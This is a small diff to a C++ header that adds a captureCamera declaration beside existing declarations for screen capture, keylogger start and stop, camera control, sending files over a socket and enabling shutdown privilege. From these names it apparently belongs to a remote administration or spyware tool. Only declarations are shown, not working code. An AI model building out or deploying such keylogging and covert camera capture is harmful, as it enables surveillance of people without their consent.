@@ -47,6 +47,7 @@ void captureScreen();
 void startKeylogger();
 void stopKeylogger();
 void startCamera();
+void captureCamera();
 void stopCamera();
 void sendFile(CSocket& socket, const string& filePath);
 bool enableShutdownPrivilege();
